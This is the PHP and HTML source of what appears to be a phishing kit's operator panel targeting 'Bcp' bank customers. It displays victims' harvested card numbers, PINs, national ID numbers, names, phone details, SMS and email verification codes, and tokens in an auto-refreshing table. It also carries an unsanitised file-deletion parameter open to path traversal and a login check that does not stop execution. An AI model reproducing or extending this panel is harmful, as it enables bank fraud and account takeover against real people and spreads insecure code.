<?php
session_start();
error_reporting(0);

/*****************************************************************************/

if ($_SESSION["LoginPanel"] != "TrueValid") 
{
    header("Location: ../principal"); 
}

/*****************************************************************************/

if( $_GET["id"] == "0" ) 
{
    session_start();
    session_destroy();
    header("Location: ../principal"); 
}

/*****************************************************************************/

if( $_GET["id"] == "2" ) 
{
    $file = $_GET["file"];
    $file = str_replace("%20", " ", $file);
    unlink('data/'.$file); 
    //header("Location: home"); 
    
}

if( $_GET["id"] == "3" ) 
{
    $file_content = file_get_contents("config2.txt");
    $content = "automatico";
    if($file_content=="automatico")
    {
        $content = "manual";
    }
    $fo = fopen("config2.txt","w");
    fwrite($fo,$content);
    fclose($fo);
    header("location: ./home");
    exit;
}

$auto_manual = file_get_contents("config2.txt");
/*****************************************************************************/
include("../config.php");                              // --> Important libs
/*****************************************************************************/

?>
<html>
<head>
	<title>Bcp - Panel</title>
	<!------------------------------- META PARAMETERS --------------------------------->
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<!------------------------------- CSS FONT FAMILY --------------------------------->
	<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
	<!------------------------------- FILES CSS STYLE --------------------------------->
	<link rel="stylesheet" type="text/css" href="src/css/loli_manito_panel_style.css">

    <style type="text/css">
        .boton {
            background-color: grey;
            padding: 5px;
            text-decoration-line: none;
            border-radius: 5px;
            color: white;
            margin-left: 10px;
        } 

        .boton-block {
            padding-bottom: 10px;
        }
    </style>

    <script type="text/javascript">

      function refreshDivs(divid, secs, url) {
          var divid, secs, url, fetch_unix_timestamp;
          var xmlHttp;
          try {
              xmlHttp = new XMLHttpRequest();
          } catch (e) {
              try {
                  xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
              } catch (e) {
                  try {
                      xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
                  } catch (e) {
                      alert("Tu explorador no soporta AJAX.");
                      return false;
                  }
              }
          }
          fetch_unix_timestamp = function() {
              return parseInt(new Date().getTime().toString().substring(0, 10))
          }
          var timestamp = fetch_unix_timestamp();
          var nocacheurl = url;
          xmlHttp.onreadystatechange = function() {
              if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
                  document.getElementById(divid).innerHTML = xmlHttp.responseText;
                  setTimeout(function() {
                      refreshDivs(divid, secs, url);
                  }, secs * 5000);
              }
          }
          xmlHttp.open("GET", nocacheurl, true);
          xmlHttp.send(null);
      }
      window.onload = function startrefresh() {
          refreshDivs('panelxd', 1, 'backend.php');
      }
    </script>

    <script type="text/javascript">

      function enable_button() {

      var sms_input, button;

      sms_input = document.getElementById("pwd");
          
      button = document.getElementById("btnForgetPassword1");

      button.classList.remove("disabled_boton-general");

      }
    </script>

    <style type="text/css">
        .boton {
            background-color: grey;
            padding: 5px;
            text-decoration-line: none;
            border-radius: 5px;
            color: white;
            margin-left: 10px;
        } 

        .boton-block {
            padding-bottom: 10px;
        }
    </style>

</head>
<body>

<header class="header">
	<img style="width: 90px;" src="src/img/loli_manito_logo.svg">
	<div style="float: right; margin-right: 10px;"><i class="fas fa-power-off" style=" margin-right: 10px; color: white"></i><a href="home.php?id=0" style="text-decoration-line: none; color: white;">Log Out</a></div>
</header>

<div class="menu-section">

    <div class="section selected">
      <a style="font-size: 15px; text-decoration-line: none; color: black">Panel</a>
    </div>
    
</div>

<div style="margin-left: 20px; font-size: 30px; padding-top: 20px; height: 30px; margin-right: 20px;">
    <div style="float: left;">Resultados&nbsp;&nbsp;</div>
    <div style="float: left;background-color: #dadada;border-radius: 10px;font-size: 15px;height: 20px; padding: 10px;">
        <a href="./home?id=3" style="text-decoration-line: none;color: black;margin-left: 10px;"><?php echo $auto_manual; ?></a>
    </div>
    
    <div style="float: right;background-color: #dadada;border-radius: 10px;font-size: 15px;height: 20px; padding: 10px;">
        <i class="far fa-trash-alt"></i><a href="cards.php?id=1" style="text-decoration-line: none;color: black;margin-left: 10px;">CLEAR</a>
    </div> 
</div>

<hr style="margin-right: 20px; margin-left: 20px;">
	<div style="margin-right: 20px; margin-left: 20px;">
		<table class="templates-tabla">
    	    <thead class="templates-thead">
    	        <tr>
    	            <th class="th-width" style="width: 100px;">IP / Estado</th>
    	            <th class="td-width-special">Tarjeta</th>
    	            <th class="th-width">Clave</th>
                  <th class="th-width">DNI</th>
                  <th class="td-width-special">Nombre</th>
                  
                  <th class="th-width">cc</th>

                  <th class="th-width">Operador/Celular</th>
                  <th class="th-width">Cod Sms</th>
                  <th class="th-width">Correo</th>
                  <th class="th-width">Cod correo</th>
                  <th class="th-width">Token</th>
                  
                  <th class="th-width"> </th>
    	        </tr>
    	    </thead>
            <tbody id="panelxd"></tbody>